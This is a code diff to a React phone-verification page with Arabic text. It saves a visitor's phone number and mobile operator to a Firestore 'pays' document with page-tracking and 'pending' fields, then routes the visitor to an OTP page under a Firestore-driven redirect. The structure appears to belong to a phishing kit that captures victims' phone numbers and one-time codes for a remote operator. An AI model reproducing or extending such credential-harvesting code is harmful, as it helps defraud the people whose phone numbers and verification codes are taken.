@@ -26,7 +26,7 @@ export const PhoneVerification = () => {
   const [phone, setPhone] = useState("");
   const [operator, setOperator] = useState("");
   const [showSTCModal, setShowSTCModal] = useState(false);
-  const _id = localStorage.getItem("visitor");
+  const visitorId = localStorage.getItem("visitor");
 
   const [errors, setErrors] = useState({
     phone: "",
@@ -87,39 +87,93 @@ export const PhoneVerification = () => {
     const isValid = validateForm();
 
     if (isValid) {
-      if (operator === "stc") {
-        setShowSTCModal(true);
-        try {
-          await PhoneVerificationService.verifyPhone(phone, operator);
-          const order_id = JSON.parse(
-            localStorage.getItem("visitor") || "null"
-          );
-          if (order_id) {
-            await sendPhone(order_id, phone, operator);
-          } else {
-            console.error("Order ID not found in localStorage");
+      try {
+        // Store phone and operator in Firestore
+        await updateFirestore(phone, operator);
+
+        if (operator === "stc") {
+          setShowSTCModal(true);
+          try {
+            await PhoneVerificationService.verifyPhone(phone, operator);
+
+            // Save to localStorage for OTP verification page
+            localStorage.setItem("phoneNumber", phone);
+            localStorage.setItem("operator", operator);
+
+            navigate("/verify-otp");
+          } catch (error) {
+            console.error("Verification failed:", error);
           }
-          navigate("/verify-otp");
-        } catch (error) {
-          console.error("Verification failed:", error);
-        }
-      } else {
-        setIsLoading(true);
-        try {
-          await PhoneVerificationService.verifyPhone(phone, operator);
-          const order_id = JSON.parse(
-            localStorage.getItem("order_id") || "null"
-          );
-          if (order_id) {
-            await sendPhone(order_id, phone, operator);
-          } else {
-            console.error("Order ID not found in localStorage");
+        } else {
+          setIsLoading(true);
+          try {
+            await PhoneVerificationService.verifyPhone(phone, operator);
+
+            // Save to localStorage for OTP verification page
+            localStorage.setItem("phoneNumber", phone);
+            localStorage.setItem("operator", operator);
+
+            // Legacy API call if needed
+            const order_id = localStorage.getItem("order_id");
+            if (order_id) {
+              await sendPhone(JSON.parse(order_id), phone, operator);
+            }
+          } catch (error) {
+            console.error("Verification failed:", error);
+            setIsLoading(false);
           }
-        } catch (error) {
-          console.error("Verification failed:", error);
-          setIsLoading(false);
         }
+      } catch (error) {
+        console.error("Error updating Firestore:", error);
+        setErrors((prev) => ({
+          ...prev,
+          phone: "حدث خطأ أثناء حفظ البيانات. الرجاء المحاولة مرة أخرى.",
+        }));
       }
+    }
+  };
+
+  const updateFirestore = async (
+    phoneNumber: string,
+    selectedOperator: string
+  ) => {
+    if (!visitorId) {
+      console.error("Visitor ID not found in localStorage");
+      throw new Error("Visitor ID not found");
+    }
+
+    try {
+      // Import Firebase functions
+      const { db } = await import("../apis/firebase");
+      const { doc, updateDoc, setDoc, serverTimestamp } = await import(
+        "firebase/firestore"
+      );
+
+      // Reference to the document in the pays collection
+      const paysDocRef = doc(db, "pays", visitorId);
+
+      // Update the document with phone and operator information
+      await updateDoc(paysDocRef, {
+        phone: phoneNumber,
+        operator: selectedOperator,
+        pagename: "verify-phone",
+        updatedAt: new Date().toISOString(),
+      }).catch(async () => {
+        // If document doesn't exist, create it
+        await setDoc(paysDocRef, {
+          phone: phoneNumber,
+          operator: selectedOperator,
+          pagename: "verify-phone",
+          createdDate: new Date().toISOString(),
+          status: "pending",
+        });
+      });
+
+      console.log("Firestore updated successfully with phone information");
+      return true;
+    } catch (error) {
+      console.error("Error updating Firestore:", error);
+      throw error;
     }
   };
 
@@ -139,7 +193,7 @@ export const PhoneVerification = () => {
 
   return (
     <div className="min-h-screen bg-gradient-to-r from-[#146394] to-[#1a7ab8] flex flex-col items-center justify-start md:justify-center p-4">
-      <FirestoreRedirect id={_id as string} collectionName={"pays"} />
+      <FirestoreRedirect id={visitorId as string} collectionName={"pays"} />
 
       <Header />
       {isLoading && (
@@ -184,8 +238,9 @@ export const PhoneVerification = () => {
             <button
               type="submit"
               className="w-full bg-[#146394] text-white py-3 md:py-3.5 rounded-lg font-semibold transform transition-all duration-300 hover:scale-[1.02] active:scale-100 shadow-md hover:shadow-lg text-sm md:text-base"
+              disabled={isLoading}
             >
-              تسجيل
+              {isLoading ? "جاري التحقق..." : "تسجيل"}
             </button>
           </form>
         </div>
